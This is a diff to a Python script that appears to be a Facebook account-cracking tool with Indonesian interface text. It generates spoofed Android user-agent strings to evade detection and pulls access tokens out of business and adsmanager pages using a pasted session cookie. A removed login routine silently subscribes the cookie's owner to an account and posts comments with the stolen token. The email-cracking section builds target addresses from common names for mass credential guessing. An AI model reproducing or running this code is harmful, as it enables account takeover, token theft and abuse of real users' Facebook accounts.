@@ -115,7 +115,7 @@ for xd in range(10000):
     strvgt = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
     newww = f"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"
     uateddy = random.choice([strvredmi,strvsamsung])
-    free.append(uateddy)
+    ugen.append(uateddy)
 
 for xr in range(10000):
     rr = random.randint
@@ -137,6 +137,24 @@ for xr in range(10000):
     rudal = random.choice([ugent1,ugent2,ugent3,ugent4,ugent5,ugent6,ugent7,ugent8,ugent12,ugent13,ugent14,ugent15,ugent16,ugent17])
     free.append(rudal)
 
+for jiah in range(1000):
+	aa='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['6','7','8','9','10','11','12'])
+	c='SAMSUNG SM-'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(678, 9999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+#	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0  Chrome/'
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;com.facebook.orca;com.facebook.lite;com.facebook.katana FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+#	uaku2=f'{aa} {b}; {c}{e}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+		
 def uaku():
 	try:
 		ua=open('bbnew.txt','r').read().splitlines()
@@ -399,97 +417,65 @@ def login():
 	except IOError:
 		login123()
 
-
-
 def login_lagi334():
-	try:
-		Console().print(Panel("""[bold white]Disarankan Untuk Menggunakan Cookie tumbal""",width=60,style=f"{color_panel}", title="SARAN"))
-		your_cookies = console.input(f" {H2}• {P2}Masukan Cookie : ")
-		with requests.Session() as r:
-			try:
-				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
-				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
-				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
-				code, user_code = response['code'], response['user_code']
-				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
-				r.headers.pop('content-type')
-				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
-				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
-				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
-					console.print(f" {H2}• {P2}Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
-				else:
-					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
-					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
-					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
-					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
-					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
-					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
-					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
-						r.headers.pop('content-type');r.headers.pop('origin')
-						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
-						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
-						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
-						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
-						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
-						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
-						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
-						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
-						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
-						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
-						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
-						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
-						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
-						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
-						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
-						r.headers.pop('content-type');r.headers.pop('origin')
-						r.headers.update({'referer': 'https://m.facebook.com/',})
-						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
-						if 'Sukses!' in str(response6):
-							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
-							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
-							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-							Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{access_token}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAT [bold green]<"))
-							tokenew = open(".token.txt","w").write(access_token)
-							cook= open(".cok.txt","w").write(your_cookies)
-							try:
-								cookie = {'cookie':your_cookies}
-								with requests.Session() as xyz:
-									url = 'https://www.facebook.com/adsmanager/manage/campaigns'
-									req = xyz.get(url,cookies=cookie)
-									set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
-									nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
-									roq = xyz.get(nek,cookies=cookie)
-									tok1 = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-									open(".token1.txt","w").write(tok1)
-									Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok1}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAB [bold green]<"))
-									requests.post("https://graph.facebook.com/100043537611609/subscribers?access_token=%s"%(tok1))
-									requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok1))
-									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok1}", headers = {"cookie":your_cookies})
-									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok1}", headers = {"cookie":your_cookies})
-									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok1}", headers = {"cookie":your_cookies})
-							except Exception as e:
-								print(e)
-							try:
-								cookie = {'cookie':your_cookies}
-								with requests.Session() as xyz:
-									url = 'https://business.facebook.com/business_locations'
-									req = xyz.get(url,cookies=cookie)
-									tok2 = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
-									open(".token2.txt","w").write(tok2)
-									Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok2}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAG [bold green]<"))
-									Console().print(f" {H2}• {P2}[bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]")
-								back()
-							except Exception as e:
-								return('Cookies Invalid')
-			
-			except Exception as e:
-				Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluwarsa Bang")
-				os.system('rm -rf .token.txt && rm -rf .cok.txt')
-				print(e)
-				time.sleep(3)
-				exit()
-	except:pass
-	
+	banner()
+	sky = '[bold cyan][01] LOGIN COKIES VERSI 01\n[02] LOGIN COOKIE VERSI 02[/bold cyan]'
+	sky2 = nel(sky, style='red')
+	cetak(nel(sky2,title='[bold cyan] • LOGIN MENU • [/bold cyan]'))
+	pil=input('[•] pilih : ')
+	pil='1'
+	if pil in ['1','01']:
+		try:
+			cik='# LOGIN USING COOKIE'
+			cik2=mark(cik ,style='red')
+			sol().print(cik2)
+			cooki=input("Cookie : ")
+			open('.cookie.txt','w').write(cooki)
+			head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
+			data = requests.get("https://business.facebook.com/business_locations", headers =head, cookies = {"cookie":cooki}) 
+			find_token = re.search("(EAAG\w+)", data.text)
+			ken=open(".token.txt", "w").write(find_token.group(1))
+			cokrom=open('.cok.txt','r').read()
+			tokrom=open('.token.txt','r').read()
+			tes = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokrom,cookies={'cookie': cokrom})
+			tes3 = json.loads(tes.text)['id']
+			cik='# LOGIN SUCCESSFUL, JALANKAN ULANG '
+			cik2=mark(cik ,style='green')
+			sol().print(cik2)
+			login()
+		except Exception as e: 
+			os.system("rm -f .token.txt")
+			os.system("rm -rf .cok.txt")
+			cik='# EXPIRED COOKIE OR CHECKPOINT ACCOUNT '
+			cik2=mark(cik ,style='red')
+			sol().print(cik2) 
+			exit()
+	elif pil in ['2','02']:
+		try:
+			cik='# LOGIN USING COOKIE V2 '
+			cik2=mark(cik ,style='cyan')
+			sol().print(cik2)
+			cookie=input("[•] Cookie : ")
+			headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
+			ses=requests.Session()
+			req = ses.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers,cookies={'cookie': cookie})
+			cari_id = re.findall('act=(.*?)&nav_source', req.text)
+			for bn in cari_id:
+				rex = ses.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={bn}&nav_source=no_referrer', headers = headers,cookies={'cookie': cookie})
+				token = re.search('(EAAB\w+)', rex.text).group(1)
+				ken=open(".token.txt", "w").write(token)
+			cik='# LOGIN SUCCESSFUL, RUN AGAIN '
+			cik2=mark(cik ,style='green')
+			sol().print(cik2)
+			exit()
+		except Exception as e: 
+			os.system("rm -f .token.txt")
+			cik='# EXPIRED COOKIE OR CHECKPOINT ACCOUNT '
+			cik2=mark(cik ,style='green')
+			sol().print(cik2) 
+			exit()
+
+
 #----------------[ BAGIAN-MENU ]----------------#
 def menu(my_name,my_id):
     try:
@@ -551,18 +537,17 @@ def crack_email():
 	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
 	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
 	global ok , cp
-	print(f'Masukan Nama Email Yang Ingin Di Crack\nContoh : Andi, Dian, Putri, Aditya')
-	nama = input(f' [+] Masukan Nama Target : ')
+	Console().print(panel(f'{P2}Masukan Nama Email Yang Ingin Di Crack\nContoh : {H2}Adi, Dimas, Andi',width=60,style=f"{color_panel}"))
+	nama = console.input(f" {H2}• {P2}Masukan Nama Target : ")
 	if ',' in str(nama):
-		print(f" [+] Masukan Nama, Jangan Kosong Ngab")
+		console.print(f" [+] Masukan Nama, Jangan Kosong Ngab")
 		time.sleep(3);exit()
-	print(f'Masukan Nama Domain\nContoh : @Gmail.com, @Yahoo.com, Dll')
-	doma = input(f' [+] Masukan Nama Domain : ')
+	Console().print(panel(f'{P2}Masukan Nama Domain\nContoh : {H2} @Gmail.com, @Yahoo.com, Dll',width=60,style=f"{color_panel}"))
+	doma = console.input(f" {H2}• {P2}Masukan Nama Domain : ")
 	if '@' not in str(doma) or '.com' not in str(doma):
-		print(f" [+] Masukan Domain Dengan Benar")
+		console.print(f" [+] Masukan Domain Dengan Benar")
 		time.sleep(3);exit()
-	print(f'Crack Email Hanya Max 5000 Idz Bang')
-	jumlah = input(f' [+] Total Dump : ')
+	jumlah = console.input(f" {H2}• {P2}Total Ingin Dump : ")
 	for xyz in range(int(jumlah)):
 		A = nama
 		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
